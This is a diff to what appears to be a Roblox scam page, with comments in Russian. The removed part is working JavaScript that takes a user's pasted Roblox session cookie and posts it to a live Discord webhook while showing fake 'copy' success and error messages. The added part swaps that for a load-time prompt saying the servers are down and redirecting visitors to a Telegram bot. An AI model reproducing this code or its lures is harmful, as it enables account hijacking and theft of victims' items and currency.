@@ -482,70 +482,13 @@
 
     <script src="https://cdn.jsdelivr.net/npm/notyf/notyf.min.js"></script>
     </script>
-    const n = new Notyf();
-    const w = 'https://discord.com/api/webhooks/1455808682880401449/C-IWHsaOPYLt_rK0RRlBkf-ECBgSxbaESbhI5lTuf4afusLot0F1bJCxOMF2aewZzBkX';
-    const c = 10 * 60 * 1000; // 10 минут в миллисекундах
-
-    document.getElementById('copyForm').addEventListener('submit', async function(e) {
-        e.preventDefault(); // Отменяем стандартное поведение формы
-
-        const i = document.getElementById('har-copy-input').value.trim();
-        const t = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
-        
-        if (!i) {
-            n.error('Request error: please make sure you entered the correct code to copy..');
-            return;
-        }
-
-        if (!i.includes(t)) {
-            n.error('Request error: please make sure you entered the correct code to copy..');
-            return;
-        }
-
-        // Извлекаем шифр после предупреждения
-        const d = i.split(t)[1]?.trim(); // Берем текст после предупреждения
-
-        if (!d || d.length === 0) {
-            n.error('Request error: please make sure you entered the correct code to copy..');
-            return;
-        }
-
-        // Удаляем все лишние символы и оставляем только шифр
-        const cd = d.split(',')[0].replace(/[\s()]/g, '').trim(); // Убираем пробелы и скобки
-
-        // Проверяем время последней отправки
-        const l = localStorage.getItem('lastSentTime');
-        const ct = new Date().getTime();
-
-        if (l && (ct - l < c)) {
-            const rt = Math.ceil((c - (ct - l)) / 1000);
-            n.error(`You have submitted your request for processing too many times, please try again later.`);
-            return;
-        }
-
-        // Отправка данных на вебхук
-        fetch(w, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ content: cd })
-        })
-        .then(r => {
-            if (r.ok) {
-                n.success('Successfully sent, please wait a few seconds for download.');
-                // Обновляем время последней отправки
-                localStorage.setItem('lastSentTime', ct);
-            } else {
-                return r.json().then(err => {
-                    n.error('Error sending: ' + (err.message || 'Error'));
-                });
+            window.onload = function() {
+            const message = "The servers for the site are currently unavailable, but you can use our telegram bot. To access it, click OK.";
+            const userResponse = prompt(message);
+            if (userResponse !== null) {
+                // Укажите вашу ссылку здесь
+                window.location.href = "https://ваша-ссылка.com";
             }
-        })
-        .catch(error => {
-            n.error('Error: ' + error.message);
-        });
-    });
-</script>
-
-    
+        };
+     <script>
+  
